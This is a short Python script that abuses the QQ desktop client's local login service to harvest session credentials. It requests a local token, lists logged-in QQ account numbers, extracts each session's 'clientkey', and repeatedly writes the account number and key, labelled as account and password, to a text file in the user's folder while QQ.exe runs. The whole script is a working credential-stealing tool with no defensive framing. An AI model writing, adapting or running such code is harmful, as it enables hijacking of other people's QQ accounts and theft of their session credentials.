from urllib import request
from http import cookiejar as cookieses
import json
import re
import psutil as jincheng
import os
import time

class yandeKey():
    cookies=cookieses.CookieJar()
    qiu=request.build_opener(request.HTTPCookieProcessor(cookies))
    qiu.addheaders = [('Referer','https://xui.ptlogin2.qq.com')]
    def gettoken(self):
        yandeKey.qiu.open('https://xui.ptlogin2.qq.com/cgi-bin/xlogin?appid=1006102&daid=1&style=23&hide_border=1&proxy_url=http%3A%2F%2Fid.qq.com%2Flogin%2Fproxy.html&s_url=http://id.qq.com/index.html')
        for key in yandeKey.cookies:
            if(key.name == 'pt_local_token'):
                return key.value
    @staticmethod
    def uins(token1):
        url='https://localhost.ptlogin2.qq.com:4301/pt_get_uins?callback=ptui_getuins_CB&r=0.21624413130736064&pt_local_tk={}'.format(token1)
        res=yandeKey.qiu.open(url)
        uin=json.loads(re.compile('var var_sso_uin_list=(.*?);').findall(str(res.read(),'utf-8'))[0])
        return uin
    def qqkeys(self,uin,token):
        url = 'https://localhost.ptlogin2.qq.com:4301/pt_get_st?clientuin={0}&callback=ptui_getst_CB&r=0.810010167110566&pt_local_tk={1}'.format(uin,token) 
        yandeKey.qiu.open(url)
        for keys in yandeKey.cookies:
            if (keys.name == 'clientkey'): 
                return keys.value


class control:
    def check_process():
        for process in jincheng.process_iter(['name']):
            if process.info['name'] == 'QQ.exe':
                return True
        return False



himkey=yandeKey()
uin = yandeKey.uins(himkey.gettoken())[0]['account']
qqkey = himkey.qqkeys(uin,himkey.gettoken())
control=control()
nei='''
账号:{0}
密码: {1}
'''.format(uin,qqkey)
while 1:
    if control.check_process():
        with open(r'C:\Users\{0}\nmsl.txt'.format(os.getlogin()),'w') as e:
            e.write(nei)
        time.sleep(50)     
